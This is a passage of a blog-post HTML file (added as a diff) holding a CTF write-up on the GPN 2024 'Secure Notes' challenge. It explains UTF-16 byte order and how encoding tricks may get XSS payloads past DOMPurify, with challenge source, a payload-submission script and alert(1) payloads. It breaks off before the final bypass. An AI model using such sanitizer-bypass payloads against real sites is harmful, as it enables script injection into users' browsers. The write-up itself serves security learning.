@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>BOM Sniffing to XSS :: elmosalamy | blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="In this post, we will learn about text encoding, how browsers determine content encoding, talk about BOM and finally how we can bypass DOM sanitizers by just playing around with input encoding." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="//localhost:1313/posts/bom-sniffing-to-xss/" />
+
+
+
+
+<link rel="stylesheet" href="//localhost:1313/assets/style.css">
+
+  <link rel="stylesheet" href="//localhost:1313/assets/green.css">
+
+
+
+<link rel="stylesheet" href="//localhost:1313/style.css">
+
+
+<link rel="apple-touch-icon" href="//localhost:1313/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="//localhost:1313/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="BOM Sniffing to XSS">
+<meta property="og:description" content="In this post, we will learn about text encoding, how browsers determine content encoding, talk about BOM and finally how we can bypass DOM sanitizers by just playing around with input encoding." />
+<meta property="og:url" content="//localhost:1313/posts/bom-sniffing-to-xss/" />
+<meta property="og:site_name" content="elmosalamy | blog" />
+
+  <meta property="og:image" content="//localhost:1313/images/encoding-cjk.png">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2024-06-01 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+   <script id="mathjax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
+<script>
+  MathJax = {
+    tex: {
+      displayMath: [['$$', '$$']],  
+      inlineMath: [['$', '$']]      
+    }
+  };
+</script>
+
+ 
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    elmosalamy
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a target="" href="/posts">📝 Posts</a></li>
+        
+      
+        
+          <li><a target="" href="/tags">🏷️ Tags</a></li>
+        
+      
+        
+          <li><a target="_blank" href="https://aelmosalamy.github.io">🔗 Random stuff</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/posts">📝 Posts</a></li>
+      
+    
+      
+        <li><a href="/tags">🏷️ Tags</a></li>
+      
+    
+      
+        <li><a href="https://aelmosalamy.github.io">🔗 Random stuff</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="//localhost:1313/posts/bom-sniffing-to-xss/">BOM Sniffing to XSS</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2024-06-01 
+      </span>
+    
+    
+    <span class="post-author">:: aelmosalamy</span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="//localhost:1313/tags/ctf/">ctf</a>&nbsp;
+    
+    #<a href="//localhost:1313/tags/xss/">xss</a>&nbsp;
+    
+    #<a href="//localhost:1313/tags/unicode/">unicode</a>&nbsp;
+    
+  </span>
+  
+
+  
+    <img src="//localhost:1313/images/encoding-cjk.png" class="post-cover" alt="BOM Sniffing to XSS" />
+  
+
+  
+    <div class="table-of-contents">
+      <h2>
+        
+          Table of Contents
+        
+      </h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#getting-started">Getting Started</a></li>
+    <li><a href="#endianness">Endianness</a></li>
+    <li><a href="#more-than-just-text">More Than Just Text</a></li>
+    <li><a href="#bom-bom-bom">BOM&hellip; BOM&hellip; BOM&hellip;</a></li>
+    <li><a href="#assembling-the-pieces">Assembling the Pieces</a></li>
+  </ul>
+</nav>
+    </div>
+  
+
+  <div class="post-content"><div>
+        <p>In this post, we will learn about text encoding, how browsers determine content encoding, talk about BOM and finally how we can bypass DOM sanitizers by just playing around with input encoding.</p>
+<p>For those interested, this post is based on an interesting challenge called <strong>Secure Notes</strong> which was authored by <strong>@13x1</strong> and have appeared in the recent GPN 2024 CTF.</p>
+<p>We are given 16 lines of source code and access to an admin bot.</p>
+<p>Let&rsquo;s see:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">DOMPurify</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;dompurify&#34;</span>)(<span style="color:#66d9ef">new</span> (<span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;jsdom&#34;</span>).<span style="color:#a6e22e">JSDOM</span>)(<span style="color:#e6db74">&#34;&#34;</span>).window); <span style="color:#75715e">// the only dependency!
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;fs&#34;</span>).<span style="color:#a6e22e">mkdirSync</span>(<span style="color:#e6db74">&#34;notes&#34;</span>, { <span style="color:#a6e22e">recursive</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span> });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;http&#34;</span>)
+</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">createServer</span>((<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">url</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;/&#34;</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">setHeader</span>(<span style="color:#e6db74">&#34;Content-Type&#34;</span>, <span style="color:#e6db74">&#34;text/html&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">`&lt;textarea id=&#34;content&#34;&gt;&lt;/textarea&gt;&lt;br&gt;&lt;button onclick=&#34;location=&#39;/submit?&#39;+encodeURIComponent(content.value)&#34;&gt;Submit`</span>
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#34;/submit&#34;</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">content</span> <span style="color:#f92672">=</span> decodeURIComponent(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;submit?&#34;</span>)[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">id</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;crypto&#34;</span>).<span style="color:#a6e22e">randomBytes</span>(<span style="color:#ae81ff">16</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#34;hex&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;fs&#34;</span>).<span style="color:#a6e22e">writeFileSync</span>(
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">`notes/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">id</span><span style="color:#e6db74">}</span><span style="color:#e6db74">.html`</span>,
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">DOMPurify</span>.<span style="color:#a6e22e">sanitize</span>(<span style="color:#a6e22e">content</span>),
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;utf-16le&#34;</span>
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">setHeader</span>(<span style="color:#e6db74">&#34;Location&#34;</span>, <span style="color:#e6db74">`/notes/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">id</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">statusCode</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">302</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
+</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#34;/notes/&#34;</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">id</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;/notes/&#34;</span>)[<span style="color:#ae81ff">1</span>].<span style="color:#a6e22e">match</span>(<span style="color:#e6db74">/^[a-f0-9]{32}$/</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">setHeader</span>(<span style="color:#e6db74">&#34;Content-Type&#34;</span>, <span style="color:#e6db74">&#34;text/html; charset=utf-16le&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;fs&#34;</span>).<span style="color:#a6e22e">readFileSync</span>(<span style="color:#e6db74">`notes/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">id</span><span style="color:#e6db74">}</span><span style="color:#e6db74">.html`</span>));
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">e</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  })
+</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">listen</span>(<span style="color:#ae81ff">1337</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// code formatting by me
+</span></span></span></code></pre></div><p>In summary, this is a barebone Node <code>http</code> server that has three routes:</p>
+<ul>
+<li><code>/</code>: a submittable text form</li>
+<li><code>/submit?&lt;content&gt;</code>: saves <code>&lt;content&gt;</code> under <code>notes/</code></li>
+<li><code>/notes/&lt;id&gt;</code>: returns <code>notes/&lt;id&gt;.html</code> contents</li>
+</ul>
+<p>You can attempt this before moving on, just <code>npm i dompurify jsdom</code>, then <code>node app.js</code> and you are set.</p>
+<h2 id="getting-started">Getting Started<a href="#getting-started" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I hope you gave it a go, now with the solution.</p>
+<p>I will be providing a walkthrough-like explanation of the ideas required to solve this challenge as we go so we can maximize learning.</p>
+<p>First, let&rsquo;s patch our server so we can have better clarity on how&rsquo;s our input looking like internally at various stages:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;received:&#34;</span>, <span style="color:#a6e22e">content</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;sanitized:&#34;</span>, <span style="color:#a6e22e">DOMPurify</span>.<span style="color:#a6e22e">sanitize</span>(<span style="color:#a6e22e">content</span>));
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;saved:&#34;</span>, <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">DOMPurify</span>.<span style="color:#a6e22e">sanitize</span>(<span style="color:#a6e22e">content</span>), <span style="color:#e6db74">&#34;utf-16le&#34;</span>));
+</span></span></code></pre></div><blockquote>
+<p>For context, and for each of the following payloads we will be sending them and capturing the <code>id</code> of the saved note using the following scaffold:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> urllib.parse <span style="color:#f92672">import</span> quot
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ... payload here ...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/submit?</span><span style="color:#e6db74">{</span>quote(payload)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>, allow_redirects<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>note_id <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;Location&#39;</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;/notes/&#39;</span>)[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(note_id)
+</span></span></code></pre></div></blockquote>
+<p>We need the <code>note_id</code> since that is what we provide to the admin bot in case of successful XSS.</p>
+<h2 id="endianness">Endianness<a href="#endianness" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Let&rsquo;s start by seeing how the server behaves with different payloads:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;img src onerror=alert(1)&gt;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># sent: &#39;&lt;img src onerror=alert(1)&gt;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># --- server ---</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># received: &lt;img src onerror=alert(1)&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># sanitized: &lt;img src=&#34;&#34;&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># saved: &lt;Buffer 3c 00 69 00 6d 00 67 00 20 00 73 00 72 00 63 00 3d 00 22 00 22 00 3e 00&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># --- client ---</span>
+</span></span><span style="display:flex;"><span>data: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&lt;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">i</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">m</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">g</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">s</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">c</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">=</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&gt;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>decoded_utf_16_le: <span style="color:#f92672">&lt;</span>img src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p>For starters, we can see DOMPurify kick in and effortlessly sanitize our payload. The sanitized payload is then encoded and saved as little endian UTF-16 or <code>utf-16le</code> as JS calls it.</p>
+<p><code>utf-16le</code> is a variable length encoding with a minimum codepoint length of two bytes or 16-bits. Each codepoint is stored in little endian order. For example, the ASCII character <code>&lt;</code> (0x3c) will be represented as <code>\x3c\x00</code> in <code>utf-16le</code>.</p>
+<p>You can see how the buffer looks like in the example above, since our payload is restricted to ASCII, the <code>utf-16le</code> encoded payload ends up being a null byte delimited sequence of ASCII characters.</p>
+<blockquote>
+<p>Note: The python codec for little endian UTF-16 is called <code>utf-16-le</code>, the alias <code>utf-16le</code> also works as per <a href="https://docs.python.org/3/library/codecs.html">the docs</a> .</p>
+</blockquote>
+<p>Let&rsquo;s try to encode our payload in <code>utf-16-le</code> and see what happens:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;img src onerror=alert(1)&gt;&#39;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-16-le&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># sent: b&#39;&lt;\x00i\x00m\x00g\x00 \x00s\x00r\x00c\x00 \x00o\x00n\x00e\x00r\x00r\x00o\x00r\x00=\x00a\x00l\x00e\x00r\x00t\x00(\x001\x00)\x00&gt;\x00&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># --- server ---</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># received: &lt;img src onerror=alert(1)&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># sanitized: &amp;lt;img src onerror=alert(1)&amp;gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># saved: &lt;Buffer 26 00 6c 00 74 00 3b 00 69 00 6d 00 67 00 20 00 73 00 72 00 63 00 20 00 6f 00 6e 00 65 00 72 00 72 00 6f 00 72 00 3d 00 61 00 6c 00 65 00 72 00 74 00 ... 14 more bytes&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># --- client ---</span>
+</span></span><span style="display:flex;"><span>data: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&amp;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">l</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">t</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">i</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">m</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">g</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">s</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">c</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">o</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">n</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">e</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">o</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">=</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">a</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">l</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">e</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">t</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">(</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">)</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&amp;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">g</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">t</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>decoded_utf_16_le: <span style="color:#f92672">&amp;</span>lt;img src onerror<span style="color:#f92672">=</span>alert(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">&amp;</span>gt;
+</span></span></code></pre></div><p>The browser receives the byte sequence annotated as <code>data</code> above and because it has been instructed using the response&rsquo;s <code>Content-Type: application/html; charset=utf-16le</code>, it will decode the data as <code>utf-16le</code> and retrieve exactly the DOMPurify sanitized input:</p>
+<pre tabindex="0"><code>&amp;lt;img src onerror=alert(1)&amp;gt;
+</code></pre><p>which is rendered to a literal:
+<img src="/posts/bom-sniffing-to-xss/html-literal.png"></p>
+<p>Notice that in this second example, <code>onerror=alert(1)</code> was completely preserved, compared to the first one where DOMPurify removed it. In both instances, DOMPurify did what is necessary to neutralize the input. In the first case, the payload was a valid HTML tag that would have resulted in malicious code execution through <code>onerror</code>, hence DOMPurify had to strip that attribute.</p>
+<p>In this instance however, the input to DOMPurify was <code>utf-16le</code> encoded already, that is DOMPurify received a null byte delimited ASCII string similar to this (but using 0x00 instead of spaces):</p>
+<pre tabindex="0"><code>&lt; i m g   s r c   o n e r r o r = a l e r t ( 1 ) &gt;
+</code></pre><p>Our UTF-16LE encoding broke the payload, turning it into a plain text string that we can no longer use for XSS. The only thing that DOMPurify will do though, is HTML entity encode the <code>&lt;</code> and <code>&gt;</code> to <code>&amp;lt;</code> and <code>&amp;gt;</code> so that they can be displayed correctly by the browser.</p>
+<p>We need to rethink our strategy.</p>
+<p>We need a payload that meets these two conditions:</p>
+<ol>
+<li>When read by <code>DOMPurify</code> is considered benign</li>
+<li>When saved by the server as little endian, the browser can still evaluate it as XSS</li>
+</ol>
+<p>Our UTF-16LE encoded payload above meets step 1 as it is considered benign by <code>DOMPurify</code>, however, it IS actually benign and does nothing when loaded.</p>
+<p>What about UTF-16 <code>utf-16-be</code>? Let&rsquo;s try:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;img src onerror=alert(1)&gt;&#39;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-16-be&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># sent: b&#39;\x00&lt;\x00i\x00m\x00g\x00 \x00s\x00r\x00c\x00 \x00o\x00n\x00e\x00r\x00r\x00o\x00r\x00=\x00a\x00l\x00e\x00r\x00t\x00(\x001\x00)\x00&gt;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># --- server ---</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># received: &lt;img src onerror=alert(1)&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># sanitized: &amp;lt;img src onerror=alert(1)&amp;gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># saved: &lt;Buffer 26 00 6c 00 74 00 3b 00 69 00 6d 00 67 00 20 00 73 00 72 00 63 00 20 00 6f 00 6e 00 65 00 72 00 72 00 6f 00 72 00 3d 00 61 00 6c 00 65 00 72 00 74 00 ... 14 more bytes&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># --- client ---</span>
+</span></span><span style="display:flex;"><span>data: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&amp;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">l</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">t</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">i</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">m</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">g</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">s</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">c</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">o</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">n</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">e</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">o</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">=</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">a</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">l</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">e</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">t</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">(</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">)</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&amp;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">g</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">t</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>decoded_utf_16_le: <span style="color:#f92672">&amp;</span>lt;img src onerror<span style="color:#f92672">=</span>alert(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">&amp;</span>gt;
+</span></span></code></pre></div><p>Data received, sanitized and saved by the server is exactly the same as it&rsquo;s little endian counterpart, perhaps the leading null byte is stripped at some point either by <code>DOMPurify</code> or by the <code>http</code> server, not sure.</p>
+<p>The exact reason is irrelevant since regardless of where exactly was the leading null byte stripped, the result will be the same, we are getting a string of null byte delimited ASCII characters that is completely benign and produces the same result:
+<img src="/posts/bom-sniffing-to-xss/html-literal.png"></p>
+<h2 id="more-than-just-text">More Than Just Text<a href="#more-than-just-text" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>What if we flip the bytes?</p>
+<p>The Unicode codepoint <code>\u003c</code> when interpreted as big endian, will give us the character equivalent to <code>0x3c = 60 = &quot;&lt;&quot;</code> while the <em>same</em> sequence, interpreted as little endian will give us the character equivalent to <code>0x3c00 = 15360 == &quot;㰀&quot;</code>. This is critical for solving this challenge.</p>
+<p>To demonstrate:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\u003c</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&lt;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\u3c00</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;㰀&#39;</span>
+</span></span></code></pre></div><table>
+<thead>
+<tr>
+<th><img src="/posts/bom-sniffing-to-xss/unicode-less-than.png"></th>
+<th><img src="/posts/bom-sniffing-to-xss/unicode-chinese.png"></th>
+</tr>
+</thead>
+</table>
+<p>The figure above shows us both codepoints next to each other, one is a special HTML character that signals the start of a tag (<code>0x3c</code>) while the other is a CJK character (<code>0x3c00</code>) that has no meaning, well at least to an HTML parser :)</p>
+<blockquote>
